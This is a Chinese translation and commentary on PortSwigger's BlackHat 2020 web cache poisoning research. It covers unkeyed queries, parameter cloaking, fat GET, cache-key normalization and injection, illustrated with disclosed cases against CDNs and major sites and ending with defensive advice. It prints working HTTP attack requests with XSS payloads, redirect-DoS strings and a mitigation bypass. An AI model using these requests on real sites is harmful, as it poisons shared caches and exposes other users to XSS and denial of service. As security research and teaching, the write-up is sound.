> 原文链接: https://www.anquanke.com//post/id/213597 


# BlackHat2020议题之Web缓存投毒


                                阅读量   
                                **140266**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t014482c00a2979d21e.png)](https://p2.ssl.qhimg.com/t014482c00a2979d21e.png)



周末闲着没事就来学习下新的思路吧

[![](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e4fb61640f341fe906a8c5b8fef7a98~tplv-k3u1fbpfcp-zoom-1.image)](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e4fb61640f341fe906a8c5b8fef7a98~tplv-k3u1fbpfcp-zoom-1.image)

不过这篇文章真的长，码字就码了一天…

本文将会介绍Web缓存投毒的各种骚姿势以及利用链，并会搭配相应案例进行讲解，看完你一定会有收获的。Have Fun!



## Web缓存投毒基础

Web缓存大家应该都有所了解吧，这是一种典型的用空间换时间的技术。而Web缓存一般分为两种
- 浏览器缓存
- Web服务器端缓存
两者原理都是差不多的，只不过缓存的位置不一样，一个是把请求过的资源暂且放在浏览器

这样当用户下一次访问相同资源的时候，就不需要再访问Web服务器了，甚至连网络请求都不用发送出去就可以得到对应的资源

而另一个则是把请求过的资源暂且放在一个专门的缓存服务器上，例如CDN,这样，当下一个用户访问同样的资源时就可以直接从缓存服务器上拿到响应，从而减轻Web服务器的压力

本文所探讨的缓存投毒都是针对服务器端的缓存，浏览器缓存投毒暂不讨论…

不知道大家读完上面的内容是不是有这么一个疑问：

> 服务器怎么确定两个用户访问的是同一个资源呢？

诶，这个时候就要提到cache key了，这个cache key是用来标识每个请求的，如果两个请求的cache key相同，那么服务端就认为他们是同一个请求，如果此时缓存服务器上已经有该cache key指定的请求对应的资源文件了，就直接从缓存服务器返回一个响应给用户，如果缓存服务器上还没有该资源则把这个请求转发到Web服务器，让Web服务器响应该请求

那么有人又要问了：

> 那cache key是根据什么规则生成的呢？

其实很简单，就是提取http请求中的某些元素组成一个cache key，一般情况下cache key是由请求方法、路径、query、host头组成。例如下面这样一个http请求

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3a5fc675385146c68d44c80d50326008~tplv-k3u1fbpfcp-zoom-1.image)

它的cache key就可以为`https|GET|portswigger.net|/research?x=1`,注意我这里的用词，是“可以为”，也就是说cache key的生成规则不是固定的，不同的网站、应用的cache key生成规则是不一样的，这个是可以自定义的

http请求中没有被用作cache key的部分我们称其为“unkeyed”元素，如果一个unkeyed的元素可以被用来生成一个危险的响应，那么我们就可以利用这个元素来进行缓存投毒，并影响其它用户。

文字阐述可能不是太好理解，那么我举一个🌰,现在有如下场景

[![](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dd7723f1f7174342833073b4184a1e86~tplv-k3u1fbpfcp-zoom-1.image)](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dd7723f1f7174342833073b4184a1e86~tplv-k3u1fbpfcp-zoom-1.image)

可以看到，响应中将请求头X-Forwarded-Host的值直接拼接到meta标签的content属性中了，这是很明显的一处反射型xss

由于输入点是在请求头中，所以利用难度稍微有一点点大

但是，只要我们配合上缓存投毒，这个漏洞一下子变得🐂🍺起来，由于X-Forwarded-Host这个头不是cache key的一部分，所以，以下两个请求被认为是一致的

```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;
```

vs

```
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
```

如果我们先发送第一个请求到服务器，服务器就会返回如下响应,并缓存到缓存服务器中

```
HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
&lt;meta property="og:image" content="https://a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/&gt;
```

很明显，这是一个存在xss的恶意响应

当其他用户下一次正常访问`/en?cb=1`页面时，会发送上述第二个请求，由于两个请求的cache key一致，服务器认为他们请求的同一个资源，所以就会把之前我们投毒的恶意缓存返回给用户，从而造成用户被xss

投毒流程大体如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ff7b5509b384489da995018373411fc4~tplv-k3u1fbpfcp-zoom-1.image)



## 之前的一些研究

其实在2018年James Kettle就已经针对Web缓存投毒进行过研究了，并发布了一篇paper

`https://portswigger.net/research/practical-web-cache-poisoning`

这篇paper中主要研究的是利用非标准的http请求头来给缓存投毒，例如`X-Forwarded-Host`和 `X-Original-URL`,当然，这也是比较简单直接的一种投毒方法

但是，本文的内容则不太一样了，本文的研究对象是那些以往经常出现在cache key中的元素，例如host头、path或者query。

当然，如果这些元素是直接放到cache key中作为cache key的一部分的话是不可能被投毒的

但是，我们发现这些元素在放入cache key之前总会被解析、转换或者规范化，正是这些前置操作导致了我们可以利用它们

那么，要怎么利用呢？我们接着往下看



## 利用方法

Web缓存投毒从挖掘到利用可以归结为下面这张图片

[![](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/950d4e3e06d74ca485affcd5b949d6f5~tplv-k3u1fbpfcp-zoom-1.image)](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/950d4e3e06d74ca485affcd5b949d6f5~tplv-k3u1fbpfcp-zoom-1.image)

我来大概解释一下这张图：

### <a class="reference-link" name="%E7%90%86%E8%A7%A3cache%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6"></a>理解cache的工作机制

首先咱们得找到一处可以利用的缓存页面，那怎样才算是一处可以利用的缓存点呢？需要满足以下几点
- 该页面会被缓存
- 我们能够明确知道我们的请求是否命中了缓存（在响应头中可能会有提示）
- URL回显到响应中或者参数回显到了响应中
只有url或者参数被回显到了响应中我们才可以进行投毒，而且这些回显也可以帮助我们探索cache与web服务器在处理请求上的差异（现在不懂什么意思不要纠结，看完就懂了，接着往下吧）

在最幸运的情况下，服务器会直接告诉我们cache key，这样就省得我们自己探索了，当然，也可能返回给你多个cache key，不要慌张，这些cache key可能适用不同的场景，我们只要找到当前场景下正确的cache key就行

```
GET /?param=1 HTTP/1.1
Host: example.com
Origin: zxcv
Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key

HTTP/1.1 200 OK
X-Cache-Key: /example.com/index.loggedout.html?akamai-transform=9 cid=__Origin=zxcv
X-Cache-Key-Extended-Internal-Use-Only: /example.com/index.loggedout.html?akamai-transform=9 vcd=1234 cid=__Origin=zxcv
X-True-Cache-Key: /example.com/index.loggedout.html vcd=1234 cid=__Origin=zxcv
```

然后，我们还得进一步搞清楚cache key是根据什么规则形成的，在形成过程中是否有如下情况
- 转换
- 规范化
- 转义
- 解析
例如去掉特定的参数、去掉请求的所有参数、去掉host头中的端口、url解码等等，在进行完这些操作过后，再把他们放入cache key,这种行为是很危险的

那么要怎么搞清楚服务器是否进行了上述的转换呢？其实很简单，只要发送两个稍微不同的请求并观察第二个是否命中缓存就可以知道

为了便于理解，我们来看一个例子，现在有如下请求，该网站会把host头的内容作为location头的一部分进行跳转

```
GET / HTTP/1.1
Host: redacted.com

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com/en
CF-Cache-Status: MISS

```

例如，我们要探测目标站点在形成cache key的过程中有没有去掉host头中的端口号，那么我们首先发送如下请求

[![](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/834e3abe3aa44f3aba677d1b0263a4a4~tplv-k3u1fbpfcp-zoom-1.image)](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/834e3abe3aa44f3aba677d1b0263a4a4~tplv-k3u1fbpfcp-zoom-1.image)

然后再发送一个host头中没有端口号的请求，并观察它是否命中缓存

[![](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8474317c3b584ab9b7df4c1c1a0bd7b4~tplv-k3u1fbpfcp-zoom-1.image)](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8474317c3b584ab9b7df4c1c1a0bd7b4~tplv-k3u1fbpfcp-zoom-1.image)

如果命中了缓存，这说明网站在生成cache key的过程中的确移除了host头中的port

在这个场景下，我们就可以向缓存投毒，让所有用户都跳转到一个未开放的端口，从而造成Dos攻击

这个漏洞存在于很多CDN厂商上，包括Cloudflare和Fastly,我通知了他们，但是Cloudflare拒绝修复…

> 注：通常情况下，上面的信息我们可以利用cachekey泄露、 源码、文档等方式获得

### <a class="reference-link" name="%E5%88%A9%E7%94%A8"></a>利用

利用就没什么好说的了，就是结合其他漏洞或者利用链，一般有三种利用方法
- 增加反射型漏洞的危害（例如：反射型xss），让每个用户都被威胁
- 利用js、css等动态文件
- 利用一些之前不可能被利用的漏洞（浏览器不会发送的一些恶意请求，我们现在可以让缓存服务器帮我们发送）
我知道，后面两种利用场景可能比较难理解，大家也不必急于理解，因为后面会有相应的案例

## 案例学习

上面说了那么多，可能大家都还处在比较懵的状态，对于某些点不是特别清楚，所以现在咱们来看一些真实的案例，这些案例都是我在各大src中挖到的

### <a class="reference-link" name="Unkeyed%20Query%20%E6%8E%A2%E6%B5%8B"></a>Unkeyed Query 探测

在形成cache key的过程中，最常见的转换就是去掉整个query字符串，也就是`/axin/handsome.html?true=1`这个链接指向的资源，在形成cache key的过程中会去掉`?true=1`。

这种情况下，是比较难发觉目标站点使用了缓存的，你可能会直接认为他是一个静态站点…

对于动态的站点，我们一般可以通过改变参数值的方式来识别，因为动态站点在我们改变某个参数的时候与之对应的响应也会改变，例如：

```
GET /?q=axin HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
&lt;link rel="canonical" href="https://example.com/?q=axin"

```

但是，当站点在形成cache key的过程中移除掉整个query字符串的情况下，我们就不能够再使用这种方式识别动态站点了，因为你再怎么更改参数甚至是添加一个参数都会得到相同的响应，你不由得会开始思考人生🤔,就像下面这样

```
GET /?q=canary&amp;cachebuster=1234 HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
CF-Cache-Status: HIT

&lt;link rel="canonical" href="https://example.com/

```

除非这个响应中很明显的告诉你它来自缓存，就像上面这个响应一样，响应头中有`CF-Cache-Status: HIT`,否则你真就可能认为它是一个静态页面了，从而错过一个漏洞。

这种情况对扫描器极不友好，因为扫描器只是重复的发送payload,所以，他们每次都会命中缓存，每次都会拿到相同的响应

那么，要怎么打破这种尴尬的局面呢？

那当然是想办法让我们的请求不命中缓存呀，所以我们可以从被包含到cache key的请求头下手，只要我们让被包含到cache key的请求头不一样，那么就不会命中缓存了，我们也就可以判断出页面是否是静态页面以及query字符串被用在了什么地方，例如用如下请求头

```
GET /?q=canary&amp;cachebust=nwf4ws HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate, nwf4ws
Accept: */*, text/nwf4ws
Cookie: nwf4ws=1
Origin: https://nwf4ws.example.com
```

这个方法在某些系统上效果拔群，例如Coludflare,它默认吧origin这个头当做cache key的一部分。

但是，这个方法在另外一些系统上就不那么ok了，这些系统上没有使用origin头作为cache key的一部分，且我使用的这个头可能会对系统造成破坏…

幸运的是，我们还有其他办法挽救，在某些系统上，我们可以使用http方法PURGE和FASTLYPURGE来清除缓存，这在真实环境下是个很好的技巧（投毒搞出大问题还可以一键重置，就问你香不香）

除此之外，我们都知道，大多数的系统都会把path作为cache key的一部分，又因为后端系统存在path规范化，这就导致不同的cache key也可以命中同样的资源，例如针对`/`目录，在不同系统上有不同的命中方法

```
Apache: //
Nginx: /%2F
PHP: /index.php/xyz
.NET: /(A(xyz))/
```

所以，利用这一特性，在真实环境中，为了不影响其他用户，我们可以在确定漏洞存在的同时只对自己投毒

例如，我想`//axin/handsome.html`页面投毒，可以证明`/axin/handsome.html`存在漏洞，但是又不影响其他用户，因为正常用户一般不会请求`//axin/handsome.html`

### <a class="reference-link" name="Unkeyed%20Query%E5%88%A9%E7%94%A8"></a>Unkeyed Query利用

如果你学会了上面的方法，你就会发现更多的漏洞，例如我在一个新闻网站发现的一处反射型xss缓存投毒

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/750cf2d2145941ccbb6f96d5334c6bc8~tplv-k3u1fbpfcp-zoom-1.image)

```
Cache Key: https://redacted-newspaper.net//
```

原本像缓存投毒这种漏洞都是很容易就被别人提交了的，但是，由于目标系统去除掉了整个query字符串，这会迷惑大多数白帽子，让他们以为这是一个静态页面。

由于query字符串没有被包含到cache key中，所以，当用户请求如下页面时会返回被我们投毒后的页面，从而触发xss

```
GET // HTTP/1.1
Host: redacted-newspaper.net

HTTP/1.1 200 OK
...
&lt;meta property="og:url" content="//redacted-newspaper.net//?x"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/&gt;

```

```
Cache Key: https://redacted-newspaper.net//
```

上面用了两个`/`是为了在测试时不影响正常用户

### <a class="reference-link" name="%E9%87%8D%E5%AE%9A%E5%90%91Dos"></a>重定向Dos

如果一个站点没有很好利用的xss,我们该咋办呢？

由于我个人比较喜欢向缓存服务提供商投毒，所以，我就一`www.cloudflare.com`举个例子

Cloudflare的登录页面在`dash.cloudflare.com/login`，但是很多链接在跳转该页面时都使用的是`/login/`,注意最后多了一个`/`，这个斜杠很关键

经过一番探索，我发现目标把query字符串从cache key中去除掉了

```
GET /login?x=abc HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/

HTTP/1.1 301 Moved Permanently
Location: /login/?x=abc

```

```
GET /login HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/

HTTP/1.1 301 Moved Permanently
Location: /login/?x=abc

```

一眼看上去，好像这里没啥可以利用的点，但是

我们可以用一点小技巧，把这个请求变为一个Dos攻击，方法很简单，只要我们把query字符串变得更长，直接达到url允许的最大长度：

```
GET /login?x=very-long-string... HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/
```

这样，当下一个用户访问这个登录页面时，就会被重定向到我们投毒的地址去

```
GET /login HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/

HTTP/1.1 301 Moved Permanently
Location: /login/?x=very-long-string...

```

由于我们投毒的query字符串已经达到了url的最大长度，而这次重定向会多一个`/`，这就导致超出了url允许的最大长度，结果就是服务器不会接受这样一个请求

```
GET /login/?x=very-long-string... HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: MISS

```

当我把这个问题提交给Cloudflare时，一开始他们只打算在自己的站点上修复这个问题，但是考虑到使用他们产品的用户太多了，所以，他们采用了全局的防御措施——他们禁用了那些直接将query字符串回显到location头的缓存

可是，这很容易就被绕过了…

```
GET /login?x=%6cong-string… HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=long-string…
CF-Cache-Status: HIT

```

虽然这个问题已经被修复，但是如果你发现其他服务器在把一个query字符串放到location头中前进行了一些其他的转换操作，你仍然有机会绕过防御



## 缓存参数隐藏

目前为止，我们看到的都是把整个query字符串从cache key去除会造成漏洞。那么如果一个站点只是把某个特定的参数从cache key中去除掉会带来什么后果呢？

理论上，只要一个站点不把整个url回显到响应中就不会有啥问题。但是，在实操的时候，由于站点采用的各种奇奇怪怪的把特定参数从cache key中去除的方法，导致，我们可以方法来污染缓存，我把这种攻击叫做cache parameter cloaking。

例如有这样一个站点，它采用如下正则把参数`_`从cache key中移除：

```
set req.http.hash_url = regsuball(
           req.http.hash_url,
           "\?_=[^&amp;]+&amp;",
           "?");
```

然后我们有这样一个请求：

```
GET /search?q=help?!&amp;search=1 HTTP/1.1
Host: example.com
```

在这种情况下，我们就可以在不改变cache key的情况下污染参数q

```
GET /search?q=help?_=payload&amp;!&amp;search=1 HTTP/1.1
Host: example.com
```

由于正则会把字符串替换为一个`?`，所以，我们只能向带有问号的参数投毒。其他类似这样的场景还有很多，这些替换规则会给漏洞利用带来很多的限制

### <a class="reference-link" name="Akamai%E7%9A%84%E4%B8%80%E4%B8%AA%E6%A1%88%E4%BE%8B"></a>Akamai的一个案例

Akamai站点上有这样一个请求

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/09fad4ad66a843f0951edfc08feba600~tplv-k3u1fbpfcp-zoom-1.image)

不知道你有没有注意到这个请求的响应中返回了cache key?而且这个cache key中居然没有参数`akamai-transform`

很明显，Akamai的cache key是不包含akamai-transform参数的，也就是说我们可以向它投毒，而且，由于Akamai那脆弱的URL解析规则，我们可以向任何参数投毒，例如向参数`x`投毒

```
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
Host: redacted.com

HTTP/1.1 200 OK
X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__

```

### <a class="reference-link" name="Ruby%20on%20Rails%E6%A1%88%E4%BE%8B"></a>Ruby on Rails案例

在测试某一个目标时，我通过扫描器发现了一个奇怪的现象，但是，我又没有找到可利用的缓存点，于是我看了一下目标站点的缓存实现源代码。

而且，后面我发现这个站点是基于Ruby on Rails的，并且Ruby on Rails会把`;`当做参数分隔符，类似于`&amp;`,也就是说下面两个链接是等价的

```
/?param1=test&amp;param2=foo
/?param1=test;param2=foo
```

这一个把参数`utm_content`排除在cahche key之外的系统上，对于下面这样一个请求，只会看到一个参数，那就是`callback`：

```
GET /jsonp?callback=legit&amp;utm_content=x;callback=alert(1)// HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
alert(1)//(some-data)

```

```
GET /jsonp?callback=legit HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
X-Cache: HIT
alert(1)//(some-data)

```

但是，Rails却看到的是三个参数：`callback, utm_content, and callback`,由于有两个callback,所以，后一个callback参数的值会覆盖前一个

### <a class="reference-link" name="Unkeyed%E7%9A%84%E6%96%B9%E6%B3%95"></a>Unkeyed的方法

有一些系统没有把http请求的方法作为cache key的一部分，这时候我们还可以使用post方法来对cache key隐藏参数，当然，这要求那个接口既支持get方法也支持post方法，并且会把参数回显到响应中

```
POST /view/o2o/shop HTTP/1.1
Host: alijk.m.taobao.com

_wvUserWkWebView=a&lt;/script&gt;&lt;svg onload='alert%26lpar;1%26rpar;'/data-

HTTP/1.1 200 OK
…
"_wvUseWKWebView":"a&lt;/script&gt;&lt;svg onload='alert&amp;lpar;1&amp;rpar;'/data-"`}`,

```

```
GET /view/o2o/shop HTTP/1.1
Host: alijk.m.taobao.com

HTTP/1.1 200 OK
…
"_wvUseWKWebView":"a&lt;/script&gt;&lt;svg onload='alert&amp;lpar;1&amp;rpar;'/data-"`}`,

```

如果你想看更多关于这个的案例，可以移步到：

[https://enumerated.wordpress.com/2020/08/05/the-case-of-the-missing-cache-keys/](https://enumerated.wordpress.com/2020/08/05/the-case-of-the-missing-cache-keys/)

### <a class="reference-link" name="Fat%20GET"></a>Fat GET

这是我偶然间在Varnish的release notes中发现的一种手法，release notes如下：

> <p>Whenever a request has a body, it will get sent to the backend for a cache miss…<br>
…the builtin.vcl removes the body for GET requests because it is questionable if GET with a body is valid anyway (but some applications use it)</p>

如果某个站点使用了Varnish作为缓存并且没有安装builtin.vcl，且这个站点使用的框架支持get请求中带有body（我将其称之为fat get)，那么他就很容易收到攻击

Github就是这样的一个站点，我可以利用Fat get污染所有可缓存的页面，并把参数的值改为我希望的值，例如我可以通过发送如下请求污染举报页面

```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim

```

这样一来，下一次举报albinowax这个用户时都会变为举报innocent-victim,刺激不刺激？

对了，这个漏洞GIthub给了10000刀，实名羡慕

## Gadgets

从上面的案例我们可以看到，缓存投毒需要结合其他的gadgets才能发挥最大的威力。我们之前已经列举了反射型xss、重定向、登录csrf、jsonp等案例，那么还有其他gadgets吗？

JS、CSS文件在大多数情况下都是静态的，但是也有把query字符串作为文件内容的一部分的情况。但是，他们的危害通常很小，毕竟当我们直接使用浏览器访问这些文件的时候，浏览器是不会执行他们的

但是，他们可以作为缓存投毒的一个不错的目标。

如果，我们可以向这些文件中投毒，那么所有导入了他们的页面就都可以被我们所控制，无论是否跨域。

例如在新版本的css中，支持这样操作

```
GET /style.css?x=a);@import... HTTP/1.1

HTTP/1.1 200 OK

@import url(/site/home/index-part1.8a6715a2.css?x=a);@import...

```

在这个例子中query字符串不是cache key的一部分，所以我们可以对x参数进行投毒

如果一个页面引入了一个没有doctype声明的页css文件，这个文件甚至都不需要`text/css`这个content-type,浏览器会自动解析整个文件，直到遇到有效的css语法，然后执行css。

这意味着你可以通过触发服务端错误来向一个回显url的css文件投毒，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5e236e240e604a9f88c76e1653e0260e~tplv-k3u1fbpfcp-zoom-1.image)



## Cache Key规范化

一个简单的url规范化对于cache key来说都可能是危险的。为了说明问题，我们来看一个通过缓存投毒来关闭firefox更新的案例

firefox会隔三差五发送如下请求检查更新：

```
GET /?product=firefox-73.0.1-complete&amp;os=osx&amp;lang=en-GB&amp;force=1 HTTP/1.1
Host: download.mozilla.org

HTTP/1.1 301 Found
Location: https://download-installer.cdn.mozilla.net/pub/..firefox-73.mar

```

他的缓存规则大概如下：

```
server `{`
    proxy_cache_key $http_x_forwarded_proto$proxy_host$uri$is_args$args;
    location / `{`
        proxy_pass http://upstream_bouncer;
    `}`
`}`
```

这个规则设置的看起来没啥问题，但是如果你仔细读一读nginx关于proxy_pass的文档

[https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass](https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass)

你就会发现一个问题：

> If proxy_pass is specified without a URI, the request URI is passed to the server in the same form as sent by a client when the original request is processed

其中提到nginx会原模原样的把请求转发到后端，不会进行任何规范化处理，但是存储到cache key中的请求元素可能被规范化处理。

最常见的规范化就是对存储到cache key中的元素进行urldecode

所以，如果你把`?`编码过后发送如下请求,将会造成一个错误的重定向

```
GET /%3fproduct=firefox-73.0.1-complete&amp;os=osx&amp;lang=en-GB&amp;force=1 HTTP/1.1
Host: download.mozilla.org

HTTP/1.1 301 Found
Location: https://www.mozilla.org/

```

但是，由于nginx的urldecode，上面这个请求的cache key与下面这个检查更新请求的cache key是一样的

```
GET /?product=firefox-73.0.1-complete&amp;os=osx&amp;lang=en-GB&amp;force=1 HTTP/1.1
Host: download.mozilla.org

HTTP/1.1 301 Found
Location: https://www.mozilla.org/

```

这样一来，firefox的更新检查就被禁用了！



## Cache神奇的技巧

我们已经看了很多利用方法了，但是还不够，cache投毒还有其他有意思的操作，例如激活某些曾经无论如何也不可能触发的`click here to get pwned`类型的漏洞

### <a class="reference-link" name="%E7%BC%96%E7%A0%81-XSS"></a>编码-XSS

你也许遇到过下面这种xss,在burp repeater中，这看似就是一个xss:

```
GET /?x="/&gt;&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
...
&lt;a href="/?x="/&gt;&lt;script&gt;alert(1)&lt;/script&gt;

```

但是当你在浏览器中复现时，却发现怎么也复现不了（当然，除了IE),这是因为浏览器都会对特殊的字符进行url编码，并且，服务端不会解码他们

上面的请求，在浏览器中变成了这样：

```
GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
...
&lt;a href="/?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E

```

这个问题曾经只发生在path中的xss,但是如今的浏览器也开始对query中的字符串进行编码了！

幸运的是，因为有cache-key规范化的存在，这两个请求的cache key是一致的，所以，我们只要在burp中先发送一遍第一个请求，然后再引导用户访问第二个请求就可以完成攻击🌶

```
GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
X-Cache: HIT
...
&lt;a href="/?x="/&gt;&lt;script&gt;alert(1)&lt;/script&gt;

```



## Cache key注入

另外一个不可能被利用的场景是那些会影响cache key的漏洞，这种在正常情况下，我们是无法投毒的，例如，下面这个Origin头xss:

```
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'

HTTP/1.1 200 OK
X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'

&lt;script&gt;…'-alert(1)-'…&lt;/script&gt;

```

这个点确实很难利用，但是如果像Akamai这样不转义分隔符直接将所有的cache key元素拼接成一个字符串的情况呢？

我们可以构造两个拥有相同cache key的不同请求，如下：

```
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__

HTTP/1.1 200 OK
X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__

```

```
GET /?x=2__Origin='-alert(1)-' HTTP/1.1

HTTP/1.1 200 OK
X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
X-Cache: TCP_HIT

&lt;script&gt;…'-alert(1)'-…&lt;/script&gt;

```

我们先发送第一个请求，然后引导我们的目标访问第二个url,这样就完成了漏洞利用！

当然Akamai已经修复了这个漏洞，但是如果你发现同样的策略适用于host头，那么你就可以完全控制使用该cdn的所有站点

### <a class="reference-link" name="Cloudflare%E4%B8%AD%E7%9A%84cache%20key%E6%B3%A8%E5%85%A5"></a>Cloudflare中的cache key注入

轻松搞定了Akamai,我决定试试cloudflare。但是它不想akamai那样在响应头中告诉你cache key,所以我们需要去翻一翻文档，然后我发现默认的cache key组成是这样的：

```
$`{`header:origin`}`::$`{`scheme`}`://$`{`host_header`}`$`{`uri`}`
```

这意味着下面两个请求拥有相同的cache key:

```
GET /foo.jpg?bar=x HTTP/1.1
Host: example.com
Origin: http://evil.com::http://example.com/foo.jpg?bar=x
```

```
GET /foo.jpg?bar=argh::http://example.com/foo.jpg?bar=x HTTP/1.1
Host: example.com
Origin: http://evil.com
```

但是，我试了一下，发现这两个请求并不一致，于是我发邮件让cloudflare纠正他们的文档，然后我向他们的安全团队解释了这个安全问题，他们承认确实存在这个问题，但是他们不愿意告诉我具体的细节…不过我还是拿到了一件t-shirt。🤣🤣🤣

### <a class="reference-link" name="%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E9%87%8D%E5%86%99"></a>相对路径重写

这部分我不太熟悉，就不写了，具体可以到原文，原文链接我会贴在文末



## 应用内部缓存投毒

在我挖掘Adobe博客上的缓存投毒漏洞时，我发送了这样一个请求

[![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7890a15755cf4d31ac0432900cdbcbd4~tplv-k3u1fbpfcp-zoom-1.image)](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7890a15755cf4d31ac0432900cdbcbd4~tplv-k3u1fbpfcp-zoom-1.image)

然后我的Burp Collaborator server上收到了大量来自他们站点的请求

后来我才知道他们用的是一个叫做WP Rocket Cache的应用级的cache，应用层的缓存通常单独缓存响应并且没有cache key的概念，所以，我发送的这个请求实际上污染了这个站点的所有请求，把他们都导向了我的域名

```
GET / HTTP/1.1
Host: theblog.adobe.com

HTTP/1.1 200 OK
X-Cache: HIT - WP Rocket Cache
...
&lt;script src="https://collaborator-id.psres.net/foo.js"/&gt;
...
&lt;a href="https://collaborator-id.psres.net/post"&gt;…

```

这可不太妙呀，因为我不能撤回这次攻击…于是我赶紧联系了adobe

## 工具

Param Miner，一款开源的burp插件，具体使用方法见github

[https://github.com/portswigger/param-miner](https://github.com/portswigger/param-miner)

## 防御

缓存的复杂性使得人们很难对它们的安全性有任何信心。但是，你可以采取一些广泛的方法来避免最糟糕的问题。
- 首先，避免重写缓存键。相反，重写实际的请求——这样可以获得相同的性能收益，同时大量减少缓存中毒问题的可能性。
- 第二，确保您的应用程序不支持fat GET请求。
- 最后，作为深度防御措施，修补由于浏览器限制而被认为不可利用的漏洞，如self-XSS、编码- xss或资源文件中的输入反射。
## 其他

本文翻译自：[https://portswigger.net/research/web-cache-entanglement](https://portswigger.net/research/web-cache-entanglement)

我在翻译的同时加入了自己的理解，可能会有所偏差，如果觉得文章内容有问题，可以参考原文

2018年的缓存投毒研究paper: [https://portswigger.net/research/practical-web-cache-poisoning](https://portswigger.net/research/practical-web-cache-poisoning)

